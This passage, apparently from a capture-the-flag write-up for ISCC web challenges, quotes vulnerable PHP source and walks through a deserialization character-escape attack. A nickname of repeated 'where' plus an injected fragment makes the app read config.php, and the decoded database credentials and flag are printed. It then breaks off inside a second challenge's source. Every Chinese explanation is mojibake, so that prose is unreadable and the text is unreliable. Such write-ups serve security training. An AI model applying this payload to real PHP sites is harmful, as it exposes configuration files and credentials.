class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> strlen(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$user</span>-&gt;is_exists(<span class="hljs-variable">$username</span>)) &#123;<br><span class="hljs-variable">$user</span>-&gt;register(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;User name Already Exists&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;show_profile(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br>header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = unserialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = base64_encode(file_get_contents(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || strlen(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br>move_uploaded_file(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . md5(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;update_profile(<span class="hljs-variable">$username</span>, serialize(<span class="hljs-variable">$profile</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>1.å®¡è®¡ä»£ç </strong></p><ul><li><p>config.php<br>flagåœ¨è¿™é‡Œ</p></li><li><p>register.php<br>æ³¨å†Œè´¦å·ï¼Œå¯¹å¸å·å¯†ç é•¿åº¦åšå‡ºé™åˆ¶</p></li><li><p>profile.php<br>ï¼ˆ1ï¼‰å°†åºåˆ—åŒ–åçš„ç”¨æˆ·ä¿¡æ¯è¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œä¸”è¯»å–äº†ä¸Šä¼ çš„ photo æ–‡ä»¶å†…å®¹<br>ï¼ˆ2ï¼‰ç”¨base64ç¼–ç å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œäº†è¯»å–å’Œæ˜¾ç¤º</p></li><li><p>update.php<br>ï¼ˆ1ï¼‰phone é•¿åº¦ä¸º11ä½ï¼›<br>ï¼ˆ2ï¼‰nicknameé•¿åº¦å°äº 10 ä½ï¼Œä¸”åªèƒ½ä¸ºå­—æ¯å’Œæ•°å­—ï¼›<br>ï¼ˆ3ï¼‰å°†ç”¨æˆ·å¡«å†™çš„ phoneã€emailã€nickname ä»¥åŠä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåºåˆ—åŒ–</p></li><li><p>class.php<br>å­˜åœ¨å‚æ•°è¿‡æ»¤ï¼Œfilter ä¸­å°† â€˜selectâ€™, â€˜insertâ€™, â€˜updateâ€™, â€˜deleteâ€™, â€˜whereâ€™ ç­‰è¯ç”¨ â€˜hackerâ€™ æ›¿æ¢æ‰.</p></li></ul><p>å­˜åœ¨å‚æ•°è¿‡æ»¤ï¼Œwhereè¢«æ›¿æ¢æˆhackerï¼Œé•¿åº¦åŠ 1</p><p><strong>2.åºåˆ—åŒ–profile</strong><br>update.phpä¸­POSTæäº¤å®Œåå¯¹$profileè¿›è¡Œåºåˆ—åŒ–æ“ä½œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;18288669977&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;2233445588@qq.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-string">&#x27;xiaom&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;18288669977&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;2233445588@qq.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;xiaom&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢å¯ä»¥åˆ©ç”¨phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PHPåœ¨ååºåˆ—åŒ–æ—¶ï¼Œä»å·¦å¾€å³è¯»å–æ•°æ®ç±»å‹åŠé•¿åº¦ï¼Œä¸”åªè¯»å–å…¶ä¸­è§„å®šé•¿åº¦çš„æ•°æ®ï¼Œå³å½“æ•°æ®çš„é•¿åº¦å¤§äºè§„å®šçš„é•¿åº¦ï¼Œåé¢è¿˜æœ‰æ•°æ®ä¹Ÿä¸å†è¯»å–ï¼Œè€Œåé¢ä¸å†è¯»å–çš„æ•°æ®ï¼Œå°±ä¼šè¢«æŒ¤åˆ°ä¸‹ä¸€ä¸ªæ•°æ®é¡¹ä¸­ã€‚<br></code></pre></td></tr></table></figure><p><strong>3.ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</strong><br>è¿™é‡Œéœ€è¦æ„é€ è¶…å‡ºé•¿åº¦çš„æ•°æ®ï¼Œå°†è¢«æŒ¤å‡ºæ¥çš„æ•°æ®å½¢æˆå¯ä»¥è¯»å–config.php çš„æ•°æ®é¡¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„å­—ç¬¦ä¸²ä¸€å…±34ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦åœ¨ nickname å¤„å¤šæ·»åŠ 34ä½é•¿çš„æ•°æ®ï¼Œæ‰èƒ½å°†è¿™æ®µæ•°æ®æŒ¤åˆ° photo çš„ä½ç½®ä¸Šå»ã€‚</p><p>class.phpä»£ç ä¸­å­˜åœ¨è¿‡æ»¤ï¼Œ <code>where</code> è¢«æ›¿æ¢æˆäº† <code>hacker</code>ï¼Œæ­¤æ—¶å­—ç¬¦ä¸²çš„é•¿åº¦åŠ  1 ï¼Œå¦‚æœåœ¨ nickname å¤„å¡«è¿› 34 ä¸ª<code>where</code>ï¼Œå°±ä¼šè¢«æ›¿æ¢æˆ 34 ä¸ª <code>hacker</code>ï¼Œå³nickname çš„é•¿åº¦è¶…å‡ºäº† 34 ä½ã€‚</p><p>å¾—åˆ°payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>è®¿é—®register.phpï¼Œæ³¨å†Œè´¦å·ï¼Œç„¶åç™»é™†,åœ¨Nicknameå¤„å¡«å…¥ä¸Šé¢çš„payload</p><p><img src="https://img-blog.csdnimg.cn/20210504125229650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŠ“åŒ…ï¼Œå°†Nicknameä¿®æ”¹ä¸ºNickname[]æ•°ç»„ç±»å‹<br><img src="https://img-blog.csdnimg.cn/20210504125326751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>4.åˆ©ç”¨base64ç¼–ç è¯»å–flag</strong><br>æ”¾åŒ…ï¼Œç‚¹å‡»è¶…é“¾æ¥è·³è½¬åˆ°profile.phpé¡µé¢ï¼ŒæŸ¥çœ‹æºç <br><img src="https://img-blog.csdnimg.cn/20210504125526632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸€æ®µBaseç¼–ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdJU0NDe3doYXRfaXNAdGhlJl9uaWNrbmFtZSo/MTExMjIzNH0nOwo/Pgo=<br></code></pre></td></tr></table></figure><p>Base64è§£ç å¾—åˆ°flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;qwertyuiop&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;challenges&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;ISCC&#123;what_is@the&amp;_nickname*?1112234&#125;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><h2 id="which-is-the-true-iscc"><a href="#which-is-the-true-iscc" class="headerlink" title="which is the true iscc"></a>which is the true iscc</h2><blockquote><p>å°å¤åŒå­¦å¾ˆæƒ³çŸ¥é“ISCCåˆ°åº•æ˜¯ä»€ä¹ˆï¼Œä¸è¿‡ä¸Šç½‘åçš„æœç´¢è®©ä»–æ›´åŠ è¿·æƒ‘äº†â€”â€”æ€ä¹ˆæœ‰è¿™ä¹ˆå¤šISCCï¼Ÿï¼Ÿåˆ°åº•å“ªä¸ªISCCæ˜¯çœŸçš„å‘¢ï¼Ÿä½ èƒ½å¸®ä»–æ‰¾åˆ°çœŸæ­£çš„ISCCå—ï¼Ÿ<br>é¢˜ç›®å…¥å£ï¼š<a href="http://39.96.91.106:7050/">http://39.96.91.106:7050</a></p></blockquote><p>è®¿é—®é¢˜ç›®åœ°å€,æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=src&quot;</span>&gt;æˆ‘çœŸçš„æ˜¯æºç ?&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=cmd&quot;</span>&gt;å¹²ç‚¹å¥½äº‹!&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=upload&quot;</span>&gt;é€ç‚¹ä¸œè¥¿!&lt;/a&gt;<br>&lt;a href=<span class="hljs-string">&quot;/?whatareyounongshane=tellmetruth&quot;</span>&gt;å¿«å‘Šè¯‰æˆ‘çœŸç›¸!&lt;/a&gt;<br>--&gt;<br></code></pre></td></tr></table></figure><p>æŒ‰ç…§æç¤ºï¼Œè®¿é—®/?whatareyounongshane=srcï¼Œå¾—åˆ°æºç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>session_start();<br>ini_set(<span class="hljs-string">&#x27;max_execution_time&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>);<br>set_time_limit(<span class="hljs-number">5</span>);<br><br><span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;new&quot;</span>;<br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$is_unser_finished</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$iscc_file</span> = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = randstr(<span class="hljs-number">14</span>);<br>        <span class="hljs-variable">$is_upload</span> = (count(<span class="hljs-variable">$_FILES</span>) &gt; <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$is_upload</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$status</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$iscc_file</span>;<br>        <span class="hljs-variable">$status</span> = <span class="hljs-string">&quot;upload_fail&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_upload</span>) &#123;<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>                <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br><br><br>            <span class="hljs-keyword">if</span>(is_uploaded_file(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br><br>                <span class="hljs-variable">$check</span> = @getimagesize(<span class="hljs-variable">$iscc_file</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$check</span> !== <span class="hljs-literal">false</span>) &#123;<br><br>                    <span class="hljs-variable">$target_dir</span> = <span class="hljs-string">&quot;/var/tmp/&quot;</span>;<br>                    <span class="hljs-variable">$target_file</span> = <span class="hljs-variable">$target_dir</span> . randstr(<span class="hljs-number">10</span>);<br><br>                    <span class="hljs-keyword">if</span> (file_exists(<span class="hljs-variable">$target_file</span>)) &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æƒ³å•¥å‘¢ï¼Ÿæœ‰ä¸œè¥¿äº†â€¦â€¦&lt;br&gt;&quot;</span>;<br>                        finalize();<br>                        <span class="hljs-keyword">exit</span>;<br>                    &#125;<br><br>                    <span 